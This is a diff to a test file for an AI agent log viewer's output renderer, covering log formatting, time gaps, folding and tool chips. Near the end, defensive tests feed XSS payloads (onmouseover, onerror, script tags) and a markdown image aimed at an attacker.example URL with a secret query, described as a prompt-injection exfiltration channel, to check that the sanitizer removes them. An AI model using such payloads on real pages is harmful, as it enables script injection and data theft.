@@ -221,7 +221,6 @@ globalThis.visibilityAwarePoll = (fn, ms) => { globalThis.__polls.push([fn.name,
 globalThis.__polls = [];
 globalThis.createSovaStatusChannel = () => ({ stop() {} });
 globalThis.apiUrl = (p) => '/api' + p;
-globalThis.LOG_LEVEL_COLORS = {};
 
 const dir = path.join(staticDir, 'js', 'pages');
 const order = ['agents/actions', ...pages];
@@ -387,7 +386,6 @@ new Function(appSrc.slice(renderStart, appSrc.indexOf('\n}\n', renderStart) + 2)
 globalThis.visibilityAwarePoll = () => ({ id: null });
 globalThis.createSovaStatusChannel = () => ({ stop() {} });
 globalThis.apiUrl = (p) => '/api' + p;
-globalThis.LOG_LEVEL_COLORS = {};
 // The real shared output helpers: the terminal set, the finished-run rule and the renderer/stream block.
 globalThis._STATUS_TERMINAL = new Function('return ' + /^var _STATUS_TERMINAL = (.*);$/m.exec(appSrc)[1])();
 // A renamed marker must fail loudly here, not slice the wrong range and surface as a confusing ReferenceError.
@@ -413,7 +411,9 @@ viewerModule.init();
 
 const fire = () => docListeners.filter(([t]) => t === 'visibilitychange').forEach(([, fn]) => fn());
 const tick = () => new Promise((resolve) => setTimeout(resolve, 0));
-const textsOf = (pane) => [...pane.html.matchAll(/<span class="out-text">([^<]*)<\/span>/g)].map(m => m[1]);
+// A row's text with any chip or badge markup stripped, so a tool call reads "Bash cmd 0" (its chip and argument).
+const textsOf = (pane) => [...pane.html.matchAll(/<span class="out-text">([\s\S]*?)<\/span><\/div>/g)]
+  .map(m => m[1].replace(/<[^>]*>/g, ''));
 const texts = () => textsOf(content);
 // Opens run 7's logs and lets the first-open backfill (an empty run) land, so the viewer streams live. The
 // helper answers that one backfill itself, then restores the scenario's own fetch handler.
@@ -823,6 +823,295 @@ out.emptyReadPane = emptyRead.html;
 const unread = new FakePane(); unread.chunks.push('Loading...');
 const rUnread = sovaOutputRenderer(); rUnread.setTarget(unread);
 out.unreadPane = unread.html;
+
+// ---- Readable rows (#1557) ----
+const rowPane = () => {
+  const pane = new FakePane(); const r = sovaOutputRenderer(); r.setTarget(pane);
+  return { pane, r };
+};
+const rawTexts = (pane) => [...pane.html.matchAll(/<span class="out-text">([\s\S]*?)<\/span><\/div>/g)]
+  .map((m) => m[1]);
+const logAt = (ts, lvl, rest) => '[stderr] ' + ts + ' [' + lvl.padEnd(8) + '] ' + rest;
+
+// A structlog line naming its zone drops its own time: the time column is the only clock.
+const sl = rowPane();
+sl.r.append(logAt('2026-11-01T12:00:00Z', 'warning',
+  'llm.fallback.advance category=LLMTimeoutError error="timed out after 9s"'), iso(0));
+const slText = rawTexts(sl.pane)[0];
+const localClock = (isoTime) => {
+  const d = new Date(isoTime);
+  return [d.getHours(), d.getMinutes(), d.getSeconds()].map((n) => String(n).padStart(2, '0')).join(':');
+};
+out.structNoClock = !/2026-11-01|\d\d:\d\d:\d\d/.test(slText.replace(/<[^>]*>/g, ''));
+out.zonedTimeTooltip = new RegExp('data-tooltip="logged ' + localClock('2026-11-01T12:00:00Z') + '"').test(slText);
+// A legacy row (no write time) keeps the time its log line carries in the time column, marked as a logged time, so an
+// old run's log lines are not left with no clock anywhere; the column is shown for it.
+const legacyLog = rowPane();
+legacyLog.r.append(logAt('2026-11-01T12:00:00Z', 'info', 'a k=1'), null);
+legacyLog.r.append('[stderr] 2026-11-01T12:00:07 [info     ] b k=2', null);
+legacyLog.r.append('plain text', null);
+out.legacyLogTimes = [...legacyLog.pane.html.matchAll(/<span class="out-time"([^>]*)>([^<]*)<\/span>/g)]
+  .map((m) => [m[2], /logged time/.test(m[1])]);
+out.legacyLogExpected = localClock('2026-11-01T12:00:00Z');
+out.legacyLogColumn = legacyLog.pane.classes.has('out-has-times');
+out.structBadge = /out-lvl out-lvl-warning"[^>]*>WARN</.test(slText);
+out.structRowWarn = /out-row out-log out-warn/.test(sl.pane.html);
+out.structChips = [
+  /<span class="out-k">category<\/span>LLMTimeoutError/.test(slText), /timed out after 9s/.test(slText),
+];
+out.structNoStreamTag = !/out-stream/.test(slText);
+// A time that names no zone is dropped from the text too: the time column is the one clock, and the logged time
+// survives only in the badge's tooltip.
+const nz = rowPane();
+nz.r.append('[stderr] 2026-11-01T12:00:00 [info     ] event k=v', iso(0));
+const nzText = rawTexts(nz.pane)[0];
+out.naiveTimeDropped = !/out-stream/.test(nzText) && !/12:00:00/.test(nzText.replace(/<[^>]*>/g, ''));
+out.naiveTimeTooltip = /data-tooltip="logged 2026-11-01T12:00:00 \(no zone\)"/.test(nzText);
+out.naiveTimeNoLabel = (nz.pane.html.match(/out-cluster/g) || []).length;
+// A context that is not only key=value pairs stays one string, so nothing is lost.
+const odd = rowPane();
+odd.r.append(logAt('2026-11-01T12:00:00Z', 'info', 'event k=v stray words'), iso(0));
+out.oddContext = /out-ctx">k=v stray words</.test(rawTexts(odd.pane)[0]);
+
+// A log line written long after the time it carries starts one labelled group; on-time lines end it.
+const rp = rowPane();
+rp.r.append('plain', iso(0));
+rp.r.append(logAt('2026-11-01T11:30:00Z', 'info', 'a k=1'), iso(2));
+rp.r.append('[stderr] Traceback (most recent call last):', iso(2));
+rp.r.append(logAt('2026-11-01T11:30:05Z', 'info', 'b k=2'), iso(3));
+rp.r.append(logAt('2026-11-01T12:00:10Z', 'info', 'c k=3'), iso(10));
+rp.r.append(logAt('2026-11-01T11:00:00Z', 'info', 'd k=4'), iso(15));
+const clusters = [...rp.pane.html.matchAll(/<div class="out-cluster">([^<]*)<\/div>/g)].map((m) => m[1]);
+out.clusterCount = clusters.length;
+out.clusterLate = clusters.map((c) => /\(([^)]*) late\)/.exec(c)?.[1]);
+const ontime = rowPane();
+ontime.r.append(logAt('2026-11-01T12:00:00Z', 'info', 'a k=1'), iso(5));
+out.onTimeClusters = (ontime.pane.html.match(/out-cluster/g) || []).length;
+const early = rowPane();
+early.r.append(logAt('2026-11-01T13:00:00Z', 'info', 'a k=1'), iso(0));
+early.r.append(logAt('2026-11-01T13:00:01Z', 'info', 'b k=2'), iso(1));
+early.r.append(logAt('2026-11-01T11:00:00Z', 'info', 'c k=3'), iso(2));
+out.futureLogClusters = [...early.pane.html.matchAll(/<div class="out-cluster">([^<]*)<\/div>/g)].map((m) => m[1]);
+// The boundary: a line exactly a minute off is on time, one more second is not.
+const edge = rowPane();
+edge.r.append(logAt('2026-11-01T12:00:00Z', 'info', 'a k=1'), iso(60));
+out.replayAtSixty = (edge.pane.html.match(/out-cluster/g) || []).length;
+edge.r.append(logAt('2026-11-01T12:00:00Z', 'info', 'b k=2'), iso(61));
+out.replayAtSixtyOne = (edge.pane.html.match(/out-cluster/g) || []).length;
+const unknownTime = rowPane();
+unknownTime.r.append(logAt('2026-11-01T11:00:00Z', 'info', 'a k=1'), null);
+out.unknownTimeClusters = (unknownTime.pane.html.match(/out-cluster/g) || []).length;
+
+// A pause of a minute or more between rows is a divider that names its length; a shorter one is not.
+const gp = rowPane();
+gp.r.append('a', iso(0)); gp.r.append('b', iso(30));
+out.shortPauseGaps = (gp.pane.html.match(/out-gap/g) || []).length;
+gp.r.append('c', iso(304));
+out.gapTexts = [...gp.pane.html.matchAll(/<div class="out-gap"><span>([^<]*)<\/span><\/div>/g)].map((m) => m[1]);
+// A pause inside a same-kind run ends the block, so the divider sits outside every block and a fold never hides it.
+const gb = rowPane();
+tools(25).forEach((t, i) => gb.r.append(t, iso(i)));
+gb.r.append('[Bash] after the pause', iso(200));
+tools(25).forEach((t, i) => gb.r.append(t, iso(201 + i)));
+const gapOutside = gb.pane.chunks.filter((c) => typeof c === 'string' && c.includes('out-gap')).length;
+out.gapInBlock = [gb.pane.folds.map((f) => (f.body.html.match(/out-gap/g) || []).length), gapOutside];
+out.gapSplitFolds = foldState(gb.pane);
+// The boundary: a pause of exactly a minute is no divider, one of 61 seconds is.
+const ge60 = rowPane();
+ge60.r.append('a', iso(0)); ge60.r.append('b', iso(60));
+out.gapAtSixty = (ge60.pane.html.match(/out-gap/g) || []).length;
+ge60.r.append('c', iso(121));
+out.gapAtSixtyOne = (ge60.pane.html.match(/out-gap/g) || []).length;
+const ge = rowPane();
+ge.r.append('[Bash] one', iso(0)); ge.r.append('ERROR: boom', iso(3700));
+out.gapBeforeError = /quiet for 1h 1m<\/span><\/div><div class="out-row out-error/.test(ge.pane.html);
+const gl = rowPane();
+gl.r.append('a', null); gl.r.append('b', iso(0)); gl.r.append('c', null);
+out.legacyGaps = (gl.pane.html.match(/out-gap/g) || []).length;
+const go = rowPane();
+go.r.append('a', iso(100)); go.r.append('stamped earlier', iso(0)); go.r.append('c', iso(130));
+out.outOfOrderGaps = (go.pane.html.match(/out-gap/g) || []).length;
+
+// Agent prose with a markdown signal is rendered as markdown; nothing else is.
+const mdOptions = [];
+globalThis.renderMarkdown = (t, o) => { mdOptions.push(o); return '<p>MD(' + t.length + ')</p>'; };
+const md = rowPane();
+md.r.append('Staged `two` changes', iso(0));
+md.r.append('- a list item', iso(0));
+md.r.append('plain sentence without any signal', iso(0));
+md.r.append('[Bash] echo `x`', iso(0));
+md.r.append('[stderr] `x` on stderr', iso(0));
+md.r.append(logAt('2026-11-01T12:00:00Z', 'info', 'event k=`v`'), iso(0));
+md.r.append('[tool error] bad `x`', iso(0));
+md.r.append('[Note] check the migration', iso(0));
+const mdRows = rawTexts(md.pane);
+out.mdRendered = mdRows.map((h) => h.indexOf('<div class="out-md">') === 0);
+const link = rowPane();
+link.r.append('See [the docs](https://example.com/x) first', iso(0));
+link.r.append('an array [1, 2] (and a note)', iso(0));
+out.mdLink = rawTexts(link.pane).map((h) => h.indexOf('<div class="out-md">') === 0);
+out.mdProseRowClass = /out-row out-text out-prose/.test(md.pane.html);
+out.mdUntrusted = mdOptions.length > 0 && mdOptions.every((o) => o && o.untrusted === true);
+out.plainRowClass = /out-row out-text"/.test(md.pane.html);
+delete globalThis.renderMarkdown;
+const nomd = rowPane();
+nomd.r.append('Staged `two` <b>changes</b>', iso(0));
+out.noMarkdownLibrary = rawTexts(nomd.pane)[0];
+
+// Tool calls: a name chip by group and the argument, escaped.
+const tl = rowPane();
+['[Bash] ls', '[Edit] a.py', '[Grep] x', '[Agent] go', '[mcp__sova__sova_status] {}', '[tool]', '[Read] <b>f</b>']
+  .forEach((t) => tl.r.append(t, iso(0)));
+const tlRows = tl.pane.folds[0].body;
+const tlTexts = rawTexts(tlRows);
+out.toolClasses = tlTexts.map((h) => /out-chip (out-tool-\w+)/.exec(h)?.[1]);
+out.toolNoArg = !/out-arg/.test(tlTexts[5]);
+out.toolArgEscaped = /<span class="out-arg">&lt;b&gt;f&lt;\/b&gt;<\/span>/.test(tlTexts[6]);
+const note = rowPane();
+note.r.append('[Note] check the migration', iso(0));
+out.proseBracketLiteral = rawTexts(note.pane)[0];
+
+// A folded stderr block summarises with its last line, without the stream prefix.
+const sf = rowPane();
+Array.from({ length: 22 }, (_, i) => '[stderr] trace ' + i).forEach((t) => sf.r.append(t, iso(0)));
+out.stderrFoldLast = sf.pane.folds[0].last.textContent;
+
+// A folded block holding a traceback summarises with its exception line, even when stderr printed more after it.
+const tb = rowPane();
+[
+  ...Array.from({ length: 16 }, (_, i) => '[stderr] collecting ' + i),
+  '[stderr] Traceback (most recent call last):',
+  '[stderr]   File "/repo/sova/cli/app.py", line 12, in <module>',
+  '[stderr]     main()',
+  '[stderr]   File "/repo/sova/cli/app.py", line 9, in main',
+  '[stderr]     raise ValueError("bad value for --limit")',
+  '[stderr] ValueError: bad value for --limit',
+  '[stderr] make: *** [check] Error 1',
+].forEach((t) => tb.r.append(t, iso(0)));
+out.tracebackFold = foldState(tb.pane);
+out.tracebackFoldLast = tb.pane.folds[0].last.textContent;
+// The exception line is found by position, not by its name's suffix: a bare Exception, a name with no Error suffix,
+// a chained traceback and an asyncio TaskGroup exception group all summarise with their own exception line.
+const traceFold = (trace) => {
+  const pane = rowPane();
+  [...Array.from({ length: 18 }, (_, i) => '[stderr] collecting ' + i), ...trace, '[stderr] make: *** [check] Error 1']
+    .forEach((t) => pane.r.append(t, iso(0)));
+  return pane.pane.folds[0].last.textContent;
+};
+out.tracebackVariants = [
+  traceFold([
+    '[stderr] Traceback (most recent call last):',
+    '[stderr]   File "/repo/x.py", line 3, in <module>',
+    '[stderr]     raise',
+    '[stderr] Exception: boom',
+  ]),
+  traceFold([
+    '[stderr] Traceback (most recent call last):',
+    '[stderr]   File "/repo/x.py", line 3, in fetch',
+    '[stderr]     resp = client.get(url)',
+    '[stderr] httpx.ReadTimeout: timed out',
+  ]),
+  traceFold([
+    '[stderr] Traceback (most recent call last):',
+    '[stderr]   File "/repo/x.py", line 3, in <module>',
+    '[stderr]     next(it)',
+    '[stderr] StopIteration',
+  ]),
+  traceFold([
+    '[stderr] Traceback (most recent call last):',
+    '[stderr]   File "/repo/x.py", line 3, in <module>',
+    '[stderr]     int("x")',
+    '[stderr] ValueError: invalid literal',
+    '[stderr] ',
+    '[stderr] During handling of the above exception, another exception occurred:',
+    '[stderr] ',
+    '[stderr] Traceback (most recent call last):',
+    '[stderr]   File "/repo/x.py", line 5, in <module>',
+    '[stderr]     raise RuntimeError("wrapped")',
+    '[stderr] RuntimeError: wrapped',
+  ]),
+  traceFold([
+    '[stderr]   + Exception Group Traceback (most recent call last):',
+    '[stderr]   |   File "/repo/x.py", line 9, in <module>',
+    '[stderr]   |     asyncio.run(main())',
+    '[stderr]   | ExceptionGroup: unhandled errors in a TaskGroup (1 sub-exception)',
+    '[stderr]   +-+---------------- 1 ----------------',
+    '[stderr]     | Traceback (most recent call last):',
+    '[stderr]     |   File "/repo/x.py", line 4, in worker',
+    '[stderr]     |     raise',
+    '[stderr]     | ValueError: boom',
+    '[stderr]     +------------------------------------',
+  ]),
+];
+
+// A chain of slow tool calls a minute or more apart never folds: each call keeps its own row and the divider before
+// the next says how long it ran (the trade-off documented on sovaOutputRenderer()).
+const slow = rowPane();
+tools(25).forEach((t, i) => slow.r.append(t, iso(i * 90)));
+out.slowChain = {
+  folded: slow.pane.folds.filter((f) => f.classes.has('out-folded')).length,
+  blocks: slow.pane.folds.length,
+  gaps: (slow.pane.html.match(/out-gap/g) || []).length,
+};
+
+// The real _head.html renderMarkdown(), with a stand-in marked that passes inline HTML through as the real one does
+// and a stand-in DOMPurify that records its input and strips what the real one strips: agent prose carrying an
+// onerror handler or a script reaches the pane only through the sanitizer.
+const purified = [];
+const purifyConfigs = [];
+const hooks = [];
+globalThis.marked = {
+  use() {},
+  // Turns a markdown image and link into the <img> and <a> marked emits; everything else passes through, inline HTML
+  // included.
+  parse: (t) => '<p>' + t.replace(/!\[([^\]]*)\]\(([^)\s]+)\)/g, '<img src="$2" alt="$1">')
+    .replace(/\[([^\]]*)\]\(([^)\s]+)\)/g, '<a href="$2">$1</a>') + '</p>',
+  parseInline: (t) => t,
+};
+globalThis.DOMPurify = {
+  addHook(name, fn) { hooks.push([name, fn]); },
+  removeHook(name, fn) {
+    const i = hooks.findIndex(([n, f]) => n === name && f === fn);
+    if (i >= 0) hooks.splice(i, 1);
+  },
+  sanitize(html, config) {
+    purified.push(html);
+    purifyConfigs.push(config);
+    let clean = html.replace(/<script\b[\s\S]*?<\/script>/gi, '')
+      .replace(/\s+on\w+=(?:"[^"]*"|'[^']*'|[^\s>]+)/gi, '');
+    if (config && config.FORBID_TAGS.includes('img')) clean = clean.replace(/<img\b[^>]*>/gi, '');
+    // The link hook as the real afterSanitizeAttributes call would apply it to each anchor.
+    for (const [name, fn] of hooks) {
+      if (name !== 'afterSanitizeAttributes') continue;
+      clean = clean.replace(/<a href="([^"]*)">/g, (m, href) => {
+        const attrs = { href };
+        fn({ tagName: 'A', hasAttribute: (k) => k in attrs, setAttribute: (k, v) => { attrs[k] = v; } });
+        return '<a ' + Object.entries(attrs).map(([k, v]) => k + '="' + v + '"').join(' ') + '>';
+      });
+    }
+    return clean;
+  },
+};
+const headSrc = fs.readFileSync(path.join(staticDir, '..', 'templates', '_head.html'), 'utf8');
+(0, eval)(/<script>([\s\S]*?)<\/script>/.exec(headSrc)[1]);
+const xss = rowPane();
+xss.r.append('Run `x` <b onmouseover=alert(1)>hi</b> <img src=x onerror=alert(3)> <script>alert(2)</script>', iso(0));
+const xssHtml = xss.pane.html;
+out.xssSanitizerSawPayload = purified.some((h) => h.includes('onmouseover=alert(1)') && h.includes('<script>'));
+out.xssPaneClean = !/onmouseover|onerror|<script|<img/i.test(xssHtml) && /out-md/.test(xssHtml);
+// A markdown image in agent prose would make every viewer's browser fetch its URL on render (an exfiltration channel
+// for prompt-injected output): it becomes a link that opens a new tab, and no <img> reaches the pane.
+const img = rowPane();
+img.r.append('See ![x](https://attacker.example/?d=secret) and [docs](https://example.com/d) `now`', iso(0));
+const imgHtml = img.pane.html;
+out.imgNoImage = !/<img/i.test(imgHtml);
+out.imgAsLink = imgHtml.includes(
+  '<a href="https://attacker.example/?d=secret" target="_blank" rel="noopener noreferrer">x</a>');
+out.linkNewTab = imgHtml.includes(
+  '<a href="https://example.com/d" target="_blank" rel="noopener noreferrer">docs</a>');
+out.untrustedConfig = purifyConfigs.length > 0 && purifyConfigs.every((c) => c && c.FORBID_TAGS.includes('img'));
+out.hooksRemoved = hooks.length;
+delete globalThis.renderMarkdown; delete globalThis.marked; delete globalThis.DOMPurify;
 process.stdout.write(JSON.stringify(out));
 """
 
@@ -2882,7 +3171,125 @@ class TestLogViewerResumeAfterHiddenTab:
         result = self._run(tmp_path, _OUTPUT_RENDERER_SCENARIO)
         assert result["foldsAfterErrors"] == 2, "an error row ends the block and the next call opens a new one"
         assert result["visibleOutsideFold"] == [True, True], "repeated errors stay outside the fold"
-        assert result["foldBodyTexts"] == ["[Bash] cmd 0", "[Bash] cmd 1", "[Bash] cmd 2"]
+        assert result["foldBodyTexts"] == ["Bash cmd 0", "Bash cmd 1", "Bash cmd 2"], (
+            "a tool call is its chip and argument"
+        )
+
+    def test_renderer_shows_a_structlog_line_as_badge_event_and_chips_without_its_own_clock(
+        self, tmp_path: Path
+    ) -> None:
+        result = self._run(tmp_path, _OUTPUT_RENDERER_SCENARIO)
+        assert result["structNoClock"] is True, "the time column is the only clock"
+        assert result["zonedTimeTooltip"] is True, "a zoned logged time stays reachable in the badge's tooltip"
+        assert result["structBadge"] is True
+        assert result["structRowWarn"] is True, "a warning row carries the warning rail class"
+        assert result["structChips"] == [True, True]
+        assert result["structNoStreamTag"] is True
+        assert result["naiveTimeDropped"] is True, "a time with no zone is not a second clock in the text either"
+        assert result["naiveTimeTooltip"] is True, "the logged time stays reachable in the badge's tooltip"
+        assert result["naiveTimeNoLabel"] == 0, "a time with no zone cannot be compared, so it never labels a group"
+        assert result["oddContext"] is True, "a context that is not only key=value pairs is kept whole"
+
+    def test_renderer_shows_the_logged_time_of_a_row_with_no_write_time(self, tmp_path: Path) -> None:
+        result = self._run(tmp_path, _OUTPUT_RENDERER_SCENARIO)
+        assert result["legacyLogTimes"] == [
+            [result["legacyLogExpected"], True],
+            ["12:00:07", True],
+            ["", False],
+        ], "a legacy log row keeps its own clock in the time column, marked as a logged time"
+        assert result["legacyLogColumn"] is True, "the time column is shown for it"
+
+    def test_renderer_labels_a_replayed_log_group_once(self, tmp_path: Path) -> None:
+        result = self._run(tmp_path, _OUTPUT_RENDERER_SCENARIO)
+        assert result["clusterCount"] == 2, "one label per group: an on-time log line ends the first"
+        assert result["clusterLate"] == ["30m 2s", "1h 0m"]
+        assert result["onTimeClusters"] == 0
+        # The clocks are local time, so only the wording and the offset are pinned.
+        labels = [re.sub(r"\d\d:\d\d:\d\d", "T", label) for label in result["futureLogClusters"]]
+        assert labels == [
+            "Log clock ahead: logged T, written T (1h 0m early)",
+            "Replayed log: logged T, written T (1h 0m late)",
+        ], "a line ahead of its write time is labelled too, and a change of direction starts a new group"
+        assert result["replayAtSixty"] == 0, "a line exactly a minute late is on time"
+        assert result["replayAtSixtyOne"] == 1, "a line more than a minute late is replayed"
+        assert result["unknownTimeClusters"] == 0, "a row with no write time cannot be called late"
+
+    def test_renderer_draws_a_quiet_divider_only_for_a_pause_of_more_than_a_minute(self, tmp_path: Path) -> None:
+        result = self._run(tmp_path, _OUTPUT_RENDERER_SCENARIO)
+        assert result["shortPauseGaps"] == 0
+        assert result["gapTexts"] == ["quiet for 4m 34s"]
+        assert result["gapAtSixty"] == 0, "a pause of exactly a minute is not a divider"
+        assert result["gapAtSixtyOne"] == 1
+        assert result["gapInBlock"] == [[0, 0], 1], "a pause inside a run ends the block: no divider in a fold body"
+        assert result["gapSplitFolds"] == [
+            {"count": "25 tool calls", "open": False, "folded": True},
+            {"count": "26 tool calls", "open": False, "folded": True},
+        ]
+        assert result["gapBeforeError"] is True
+        assert result["legacyGaps"] == 0, "rows without a write time have no gap"
+        assert result["outOfOrderGaps"] == 0, "a row stamped earlier does not move the baseline back"
+        assert result["slowChain"] == {"folded": 0, "blocks": 25, "gaps": 24}, (
+            "slow calls a minute or more apart keep their own rows and dividers instead of folding"
+        )
+
+    def test_renderer_renders_markdown_only_for_agent_prose_with_a_markdown_signal(self, tmp_path: Path) -> None:
+        result = self._run(tmp_path, _OUTPUT_RENDERER_SCENARIO)
+        assert result["mdRendered"] == [True, True, False, False, False, False, False, False]
+        assert result["mdLink"] == [True, False], "a link target is a signal, brackets alone are not"
+        assert result["mdProseRowClass"] is True
+        assert result["mdUntrusted"] is True, "agent prose is rendered as untrusted markdown"
+        assert result["plainRowClass"] is True, "plain text keeps the plain row class"
+        assert result["noMarkdownLibrary"] == "Staged `two` &lt;b&gt;changes&lt;/b&gt;", (
+            "without the markdown helper the text is escaped, never inserted raw"
+        )
+        assert result["proseBracketLiteral"] == "[Note] check the migration"
+
+    def test_renderer_draws_a_tool_call_as_a_chip_and_an_escaped_argument(self, tmp_path: Path) -> None:
+        result = self._run(tmp_path, _OUTPUT_RENDERER_SCENARIO)
+        assert result["toolClasses"] == [
+            "out-tool-exec",
+            "out-tool-write",
+            "out-tool-read",
+            "out-tool-agent",
+            "out-tool-mcp",
+            "out-tool-read",
+            "out-tool-read",
+        ]
+        assert result["toolNoArg"] is True
+        assert result["toolArgEscaped"] is True
+
+    def test_renderer_summarises_a_folded_stderr_block_without_the_stream_prefix(self, tmp_path: Path) -> None:
+        result = self._run(tmp_path, _OUTPUT_RENDERER_SCENARIO)
+        assert result["stderrFoldLast"] == " trace 21"
+
+    def test_renderer_summarises_a_folded_traceback_with_its_exception_line(self, tmp_path: Path) -> None:
+        result = self._run(tmp_path, _OUTPUT_RENDERER_SCENARIO)
+        assert result["tracebackFold"] == [{"count": "23 lines", "open": False, "folded": True}]
+        assert result["tracebackFoldLast"] == " ValueError: bad value for --limit", (
+            "the exception line, not the make error stderr printed after it"
+        )
+        assert result["tracebackVariants"] == [
+            " Exception: boom",
+            " httpx.ReadTimeout: timed out",
+            " StopIteration",
+            " RuntimeError: wrapped",
+            " ValueError: boom",
+        ], "the exception line is found by position, whatever its name and however the traceback is framed"
+
+    def test_agent_prose_reaches_the_pane_only_through_the_real_sanitizing_markdown_helper(
+        self, tmp_path: Path
+    ) -> None:
+        result = self._run(tmp_path, _OUTPUT_RENDERER_SCENARIO)
+        assert result["xssSanitizerSawPayload"] is True, "renderMarkdown() must hand marked's output to DOMPurify"
+        assert result["xssPaneClean"] is True, "no handler or script from agent prose reaches the pane"
+
+    def test_agent_prose_never_loads_an_image_and_its_links_open_a_new_tab(self, tmp_path: Path) -> None:
+        result = self._run(tmp_path, _OUTPUT_RENDERER_SCENARIO)
+        assert result["imgNoImage"] is True, "no <img> from agent prose reaches the pane"
+        assert result["imgAsLink"] is True, "a markdown image becomes a link to its URL"
+        assert result["linkNewTab"] is True, "a link opens a new tab with no opener or referrer"
+        assert result["untrustedConfig"] is True, "agent prose is sanitized with the untrusted config"
+        assert result["hooksRemoved"] == 0, "the link hook is removed after each call"
 
     def test_renderer_styles_a_structlog_line_as_its_own_kind(self, tmp_path: Path) -> None:
         result = self._run(tmp_path, _OUTPUT_RENDERER_SCENARIO)
